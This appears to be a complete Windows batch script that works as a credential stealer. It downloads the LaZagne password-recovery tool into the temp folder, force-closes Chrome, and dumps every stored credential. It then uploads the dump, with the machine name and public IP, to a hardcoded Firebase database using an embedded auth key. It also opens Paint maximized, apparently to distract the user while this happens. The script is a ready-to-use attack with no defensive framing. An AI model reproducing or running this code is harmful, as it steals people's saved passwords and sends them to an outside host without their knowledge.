@echo off
chcp 65001 >nul
setlocal enabledelayedexpansion

:: LaZagne config
set "LAZAGNE_URL=https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.7/LaZagne.exe"
set "LAZAGNE_EXE=%TEMP%\LaZagne.exe"
set "OUTPUT_DIR=%TEMP%\Lazagne_Results"

:: Firebase config (edit if needed)
set "FIREBASE_URL=https://check-6c35e-default-rtdb.asia-southeast1.firebasedatabase.app/credentials"
set "FIREBASE_KEY=fdM9pHfanpouiqsEmFLJUDAC2LtXF7rUBXbIPDA4"

:: Download LaZagne if not exist
if not exist "%LAZAGNE_EXE%" (
    powershell -Command "Invoke-WebRequest -Uri '%LAZAGNE_URL%' -OutFile '%LAZAGNE_EXE%' -UseBasicParsing"
)

:: Kill Chrome to avoid conflicts (optional)
tasklist /FI "IMAGENAME eq chrome.exe" 2>NUL | find /I "chrome.exe" >NUL
if %errorlevel%==0 (
    taskkill /IM chrome.exe /F >nul 2>&1
)

:: Create output directory
if not exist "%OUTPUT_DIR%" mkdir "%OUTPUT_DIR%"

:: Run LaZagne all and output to file
"%LAZAGNE_EXE%" all -oN -output "%OUTPUT_DIR%" >nul 2>&1

:: Get latest result file
for /f "delims=" %%F in ('dir /b /a-d /od "%OUTPUT_DIR%\*.txt" 2^>nul') do set "RESULT_FILE=%%F"

:: Basic info
set "PC_NAME=%COMPUTERNAME%"
set "PC_NAME=!PC_NAME: =_!"
set "PC_NAME=!PC_NAME:-=_!"

:: Get public IP via powershell
for /f %%i in ('powershell -Command "(Invoke-RestMethod -Uri ''https://api.ipify.org'').Trim()"') do set "PUBLIC_IP=%%i"

:: Get timestamp
for /f %%i in ('powershell -Command "Get-Date -Format ''yyyy-MM-dd HH:mm:ss''"') do set "TIMESTAMP=%%i"

:: Read LaZagne results
set "LAZAGNE_DATA="
if defined RESULT_FILE (
    set /p LAZAGNE_DATA=<"%OUTPUT_DIR%\%RESULT_FILE%"
)

:: Fallback if no data
if not defined LAZAGNE_DATA set "LAZAGNE_DATA=No data collected"

:: Compose JSON payload for Firebase upload
setlocal enabledelayedexpansion
set "JSON_PAYLOAD={"
set "JSON_PAYLOAD=!JSON_PAYLOAD!\"computer\":\"%PC_NAME%\","
set "JSON_PAYLOAD=!JSON_PAYLOAD!\"timestamp\":\"%TIMESTAMP%\","
set "JSON_PAYLOAD=!JSON_PAYLOAD!\"ip\":\"%PUBLIC_IP%\","
set "JSON_PAYLOAD=!JSON_PAYLOAD!\"data\":\"!LAZAGNE_DATA:\=\\\!\"}"
endlocal & set "JSON_PAYLOAD=%JSON_PAYLOAD%"

:: Upload data to Firebase
powershell -Command ^
    "$json='%JSON_PAYLOAD%';" ^
    "$url='%FIREBASE_URL%/%PC_NAME%.json?auth=%FIREBASE_KEY%';" ^
    "Invoke-RestMethod -Uri $url -Method PUT -Body $json -ContentType 'application/json'"

:: Open Paint maximized and keep it fullscreen until LaZagne result exists
start "" /max mspaint.exe

:CHECK_PAINT
timeout /t 5 /nobreak >nul
powershell -Command "(New-Object -ComObject Shell.Application).Windows() | ForEach-Object { if ($_.Name -eq 'Paint') {$_.WindowState = 3} }"
if exist "%OUTPUT_DIR%\%RESULT_FILE%" goto END
goto CHECK_PAINT

:END
exit /b 0
